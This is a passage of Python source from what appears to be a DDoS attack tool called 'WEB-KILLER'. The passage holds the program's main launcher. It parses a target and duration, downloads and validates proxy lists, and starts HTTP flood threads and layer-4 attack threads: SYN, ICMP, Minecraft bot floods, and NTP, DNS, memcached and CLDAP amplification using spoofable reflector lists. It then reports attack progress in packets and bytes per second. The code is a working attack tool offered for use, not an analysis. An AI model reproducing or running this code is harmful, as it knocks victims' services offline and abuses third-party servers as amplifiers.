   L4 Proxied: python {argv[0]} <method> <ip:port> <threads> <duration> <socks_type> <proxylist>
   L4 Amplification: python {argv[0]} <method> <ip:port> <threads> <duration> <reflector file (only use with Amplification)>
''')

    @staticmethod
    def ts_srv(domain):
        records = ['_ts3._udp.', '_tsdns._tcp.']
        DnsResolver = resolver.Resolver()
        DnsResolver.timeout = 1
        DnsResolver.lifetime = 1
        Info = {}
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, 'SRV')
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(srv.port)
            except Exception:
                Info[rec] = 'Not found'
        return Info

    @staticmethod
    def info(domain):
        try:
            with get(f"https://ipwhois.app/json/{domain}/") as s:
                return s.json()
        except Exception:
            return {"success": False}


def handleProxyList(con, proxy_li, proxy_ty, url=None):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    
    if not proxy_li.exists():
        logger.warning(
            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}"
        )
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
            )
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=5, threads=100,
                url=url.human_repr() if url else "http://httpbin.org/get",
            )

            if not Proxies:
                exit(
                    "Proxy Check failed, Your network may be the problem"
                    " | The target may not be available."
                )
            stringBuilder = ""
            for proxy in Proxies:
                stringBuilder += (str(proxy) + "\n")
            wr.write(stringBuilder)

    proxies = ProxyUtiles.readFromFile(proxy_li)
    if proxies:
        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
    else:
        logger.info(f"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}")
        proxies = None

    return proxies


if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                print_banner()
                ToolsConsole.runConsole()
            if one == "STOP":
                ToolsConsole.stop()

            method = one
            host = None
            port = None
            url = None
            event = Event()
            event.clear()
            target = None
            
            urlraw = argv[2].strip()
            if not urlraw.startswith("http"):
                urlraw = "http://" + urlraw

            if method not in Methods.ALL_METHODS:
                exit(f"Method Not Found. Available: {', '.join(sorted(Methods.ALL_METHODS))}")

            if method in Methods.LAYER7_METHODS:
                url = URL(urlraw)
                host = url.host

                if method != "TOR":
                    try:
                        host = gethostbyname(url.host)
                    except Exception as e:
                        exit(f'Cannot resolve hostname {url.host}: {e}')

                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])
                proxy_ty = int(argv[3].strip())
                proxy_li = Path(__dir__ / "files/proxies" / argv[5].strip())
                useragent_li = Path(__dir__ / "files/useragent.txt")
                referers_li = Path(__dir__ / "files/referers.txt")
                bombardier_path = Path.home() / "go/bin/bombardier"
                proxies: Any = set()

                if method == "BOMB":
                    assert (
                        bombardier_path.exists() or bombardier_path.with_suffix('.exe').exists()
                    ), (
                        "Install bombardier: "
                        "https://github.com/Athexblackhat/WEB-KILLER/wiki/BOMB-method"
                    )

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                if not useragent_li.exists():
                    exit("The Useragent file doesn't exist")
                if not referers_li.exists():
                    exit("The Referer file doesn't exist")

                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
                referers = set(a.strip() for a in referers_li.open("r+").readlines())

                if not uagents:
                    exit("Empty Useragent File")
                if not referers:
                    exit("Empty Referer File")

                if threads > 1000:
                    logger.warning(f"{Colors.YELLOW}Thread is higher than 1000{Colors.RESET}")
                if rpc > 100:
                    logger.warning(f"{Colors.YELLOW}RPC (Request Pre Connection) is higher than 100{Colors.RESET}")

                print_banner()
                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                
                for thread_id in range(threads):
                    HttpFlood(thread_id, url, host, method, rpc, event,
                              uagents, referers, proxies).start()

            if method in Methods.LAYER4_METHODS:
                target = URL(urlraw)
                port = target.port
                target_host = target.host

                try:
                    target_ip = gethostbyname(target_host)
                except Exception as e:
                    exit(f'Cannot resolve hostname {target_host}: {e}')

                if port is None or port > 65535 or port < 1:
                    if port is None:
                        logger.warning(f"{Colors.YELLOW}Port Not Selected, Set To Default: 80{Colors.RESET}")
                        port = 80
                    else:
                        exit("Invalid Port [Min: 1 / Max: 65535]")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                        not ToolsConsole.checkRawSocket():
                    exit("Cannot Create Raw Socket")

                if method in Methods.LAYER4_AMP:
                    logger.warning(f"{Colors.YELLOW}This method needs spoofable servers please check{Colors.RESET}")
                    logger.warning(f"{Colors.YELLOW}https://github.com/Athexblackhat/WEB-KILLER/wiki/Amplification-ddos-attack{Colors.RESET}")

                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                ref = None

                if method in {"SYN", "ICMP"}:
                    __ip__ = __ip__

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        refl_li = Path(__dir__ / "files" / argfive)
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                            if not refl_li.exists():
                                exit("The reflector file doesn't exist")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                            ref = set(a.strip() for a in Tools.IP.findall(refl_li.open("r").read()))
                            if not ref:
                                exit("Empty Reflector File")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_ty = int(argfive)
                            proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
                            proxies = handleProxyList(con, proxy_li, proxy_ty)
                            if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                exit("This method cannot use layer4 proxy")
                        else:
                            logger.setLevel("DEBUG")

                protocolid = con.get("MINECRAFT_DEFAULT_PROTOCOL", 74)

                if method == "MCBOT":
                    try:
                        with socket(AF_INET, SOCK_STREAM) as s:
                            s.settimeout(5)
                            s.connect((target_ip, port))
                            Tools.send(s, Minecraft.handshake((target_ip, port), protocolid, 1))
                            Tools.send(s, Minecraft.data(b'\x00'))
                            protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                            protocolid = con.get("MINECRAFT_DEFAULT_PROTOCOL", 74) if not protocolid else int(protocolid.group(1))
                            if 47 < protocolid > 758:
                                protocolid = con.get("MINECRAFT_DEFAULT_PROTOCOL", 74)
                    except Exception:
                        pass

                print_banner()
                for _ in range(threads):
                    Layer4((target_ip, port), ref, method, event, proxies, protocolid).start()

            logger.info(
                f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} {target or url.host}{bcolors.WARNING} with"
                f"{bcolors.OKBLUE} {method}{bcolors.WARNING} method for{bcolors.OKBLUE} {timer}{bcolors.WARNING}"
                f" seconds, threads:{bcolors.OKBLUE} {threads}{bcolors.WARNING}!{bcolors.RESET}"
            )
            event.set()
            ts = time()
            
            try:
                while time() < ts + timer:
                    logger.debug(
                        f'{bcolors.WARNING}Target:{bcolors.OKBLUE} {target or url.host},'
                        f'{bcolors.WARNING} Port:{bcolors.OKBLUE} {port or (url.port if url else 80)},'
                        f'{bcolors.WARNING} Method:{bcolors.OKBLUE} {method}'
                        f'{bcolors.WARNING} PPS:{bcolors.OKBLUE} {Tools.humanformat(int(REQUESTS_SENT))},'
                        f'{bcolors.WARNING} BPS:{bcolors.OKBLUE} {Tools.humanbytes(int(BYTES_SEND))}'
                        f'{bcolors.WARNING} / {round((time() - ts) / timer * 100, 2)}%{bcolors.RESET}'
                    )
                    REQUESTS_SENT.set(0)
                    BYTES_SEND.set(0)
                    sleep(1)
            except KeyboardInterrupt:
                logger.info(f"{Colors.RED}Attack interrupted by user{Colors.RESET}")

            event.clear()
            logger.info(f"{Colors.GREEN}Attack completed!{Colors.RESET}")
            exit()

        ToolsConsole.usage()